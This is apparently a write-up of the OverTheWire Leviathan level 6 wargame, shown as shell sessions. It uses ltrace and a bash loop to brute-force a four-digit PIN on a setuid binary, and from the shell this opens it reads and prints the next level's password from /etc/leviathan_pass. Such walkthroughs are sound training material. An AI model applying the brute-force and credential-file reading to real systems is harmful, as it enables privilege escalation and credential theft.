# Level 6

```shell
leviathan6@gibson:~$ ls -lah
total 36K
drwxr-xr-x  2 root       root       4.0K Sep 19 07:07 .
drwxr-xr-x 83 root       root       4.0K Sep 19 07:09 ..
-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan7 leviathan6  15K Sep 19 07:07 leviathan6
-rw-r--r--  1 root       root        807 Mar 31  2024 .profile

leviathan6@gibson:~$ ./leviathan6 0000
Wrong

leviathan6@gibson:~$ ltrace ./leviathan6 0000
__libc_start_main(0x80490dd, 2, 0xffffd474, 0 <unfinished ...>
atoi(0xffffd5e0, 0, 0, 0)                                = 0
puts("Wrong"Wrong
)                                            = 6
+++ exited (status 0) +++

leviathan6@gibson:~$ cd $(mktemp -d)

leviathan6@gibson:/tmp/tmp.CMB1JWyzYz$ touch test.sh
```

### test.sh
```shell
#!/bin/bash

for i in {0000..9999}; do
	~/leviathan6 $i
done
```

```shell
leviathan6@gibson:/tmp/tmp.CMB1JWyzYz$ chmod +x test.sh 
leviathan6@gibson:/tmp/tmp.CMB1JWyzYz$ ./test.sh >> passwords.txt
leviathan6@gibson:/tmp/tmp.CMB1JWyzYz$ head -n 5 passwords.txt 
0000
0001
0002
0003
0004

leviathan6@gibson:/tmp/tmp.CMB1JWyzYz$ ./test.sh
[...]
Wrong
7121
Wrong
7122
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
qEs5Io5yM8

$ exit
leviathan6@gibson:/tmp/tmp.CMB1JWyzYz$ exit

$ ssh leviathan7@leviathan.labs.overthewire.org -p 2223
$ qEs5Io5yM8
```
